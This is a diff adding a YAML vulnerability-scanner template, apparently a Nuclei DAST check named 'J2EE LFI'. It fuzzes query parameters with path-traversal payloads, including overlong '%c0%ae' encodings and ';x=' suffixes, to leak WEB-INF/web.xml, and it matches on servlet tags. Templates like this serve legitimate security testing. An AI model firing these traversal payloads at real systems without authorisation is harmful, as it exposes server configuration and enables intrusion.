@@ -1,0 +1,45 @@
+id: lfi-j2ee-query
+info:
+  author: shelled
+  description: Looks for J2EE specific LFI vulnerabilities, tries to leak the web.xml
+    file.
+  name: J2EE LFI
+  severity: high
+  tags: fuzzing-req-query,lfi,dast
+requests:
+- fuzzing:
+  - fuzz:
+    - '{{injection}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - <servlet-name>
+    - </web-app>
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    injection:
+    - ../../../../WEB-INF/web.xml
+    - ../../../WEB-INF/web.xml
+    - ../../WEB-INF/web.xml
+    - '%c0%ae/%c0%ae/WEB-INF/web.xml'
+    - '%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+    - '%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+    - ../../../WEB-INF/web.xml;x=
+    - ../../WEB-INF/web.xml;x=
+    - ../WEB-INF/web.xml;x=
+    - /WEB-INF/web.xml
+    - .//WEB-INF/web.xml
+    - ../WEB-INF/web.xml
+    - '%c0%ae/WEB-INF/web.xml'
+  stop-at-first-match: true
